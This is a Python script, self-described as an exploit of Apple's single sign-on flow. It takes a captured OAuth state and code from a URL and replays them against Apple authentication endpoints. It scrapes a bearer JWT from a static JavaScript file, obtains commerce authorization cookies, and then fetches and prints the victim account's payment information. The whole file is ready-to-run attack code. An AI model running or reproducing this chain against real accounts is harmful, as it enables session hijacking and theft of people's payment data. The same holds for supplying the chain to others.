import requests
import re
from urllib.parse import urlparse, parse_qs
import argparse
import json

class AppleSession:
    """
    Handles the Apple SSO and API exploitation flow.
    Each step is encapsulated in its own method.
    """
    def __init__(self, state: str, code: str, proxy: str = None):
        self.session = requests.Session()
        self.state = state
        self.code = code
        self.token = None
        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy,
            }
            self.session.verify = False  # Disable SSL verification for debugging

    def validate_grant_code(self):
        """
        Validates the grant code and retrieves initial cookies.
        """
        url = (
            f"https://idmsa.apple.com:443/appleauth/auth/authorize/validate"
            f"?frame_id={self.state}&iframeId={self.state}"
            f"&client_id=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3"
            f"&redirect_uri=https://account.apple.com"
            f"&response_type=code&response_mode=web_message"
            f"&state={self.state}&code={self.code}"
            f"&oauthRequireGrantCode=false&authVersion=latest"
        )
        cookies = {"dslang": "US-EN", "site": "USA"}
        headers = {
            "Sec-Ch-Ua": "\"Chromium\";v=\"112\", \"Brave\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Accept": "*/*",
            "Origin": "https://apps.apple.com",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-us",
            "Referer": "https://apps.apple.com/",
            "Connection": "close"
        }
        self.session.get(url, headers=headers, cookies=cookies)

    def get_token_cookies(self):
        """
        Retrieves necessary cookies for the next API call.
        """
        url = "https://appleid.apple.com:443/account/manage/gs/ws/token"
        headers = {
            "Sec-Ch-Ua": "\"Chromium\";v=\"112\", \"Brave\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://appleid.apple.com/",
            "X-Apple-I-Request-Context": "ca",
            "Connection": "close"
        }
        self.session.get(url, headers=headers)

    def extract_jwt_from_js(self):
        """
        Extracts JWT token from a static JS file.
        """
        url = "https://apps.apple.com:443/static-commerce/js/index.f1c2bf75.js"
        headers = {"Accept-Encoding": "gzip, deflate", "Connection": "close"}
        resp = self.session.get(url, headers=headers)
        pattern = r'const a="(ey+[^"]+)"'
        match = re.search(pattern, resp.text)
        if match:
            self.token = match.group(1)
        else:
            raise Exception("JWT token not found in JS file.")

    def get_commerce_authorization_token(self):
        """
        Extracts commerce-authorization-token cookies to access *.apps.apple.com APIs.
        """
        url = "https://auth.apps.apple.com:443/auth/v1/gs"
        headers = {
            "Sec-Ch-Ua": "\"Chromium\";v=\"112\", \"Brave\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Accept": "*/*",
            "Origin": "https://apps.apple.com",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-us",
            "Authorization": f"Bearer {self.token}",
            "Referer": "https://apps.apple.com/",
            "Connection": "close"
        }
        json_data = {"webAuthorizationFlowContext": "apps"}
        self.session.post(url, headers=headers, json=json_data)

    def get_payment_info(self):
        """
        Retrieves payment info from Apple API and pretty-prints the JSON response.
        """
        url = "https://buy.apps.apple.com:443/account/stackable/paymentInfos?context=CWA&isVideoEverywhere=true"
        headers = {
            "Sec-Ch-Ua": "\"Chromium\";v=\"112\", \"Brave\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Accept": "*/*",
            "Origin": "https://apps.apple.com",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-us",
            "Referer": "https://apps.apple.com/",
            "X-Apple-Store-Front": "143441-1,8",
            "Connection": "close"
        }
        resp = self.session.get(url, headers=headers)
        try:
            data = resp.json()
            print("User Data:")
            print(json.dumps(data, indent=2, ensure_ascii=False))
        except Exception as e:
            print(f"Failed to parse JSON response: {e}")
            print(resp.text)

    def run(self):
        """
        Runs the full exploitation flow.
        """
        self.validate_grant_code()
        self.get_token_cookies()
        self.extract_jwt_from_js()
        self.get_commerce_authorization_token()
        self.get_payment_info()

def extract_state_and_code(url: str):
    """
    Extracts 'state' and 'code' query parameters from a given URL.
    Args:
        url (str): The URL containing 'state' and 'code' as query parameters.
    Returns:
        tuple: (state, code) if found, else (None, None)
    """
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    state = query_params.get('state', [None])[0]
    code = query_params.get('code', [None])[0]
    return state, code

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit Apple SSO flow using state and code from a URL.")
    parser.add_argument('url', help='URL containing state and code as query parameters')
    parser.add_argument('--proxy', help='HTTP proxy (e.g., http://127.0.0.1:8080)', default=None)
    proxy="http://127.0.0.1:8080"

    args = parser.parse_args()

    state, code = extract_state_and_code(args.url)
    if not state or not code:
        print("Could not extract state and code from the provided URL.")
    else:
        print(f"Extracted state: {state}")
        print(f"Extracted code: {code}")
        apple = AppleSession(state, code, proxy=proxy)
        apple.run()

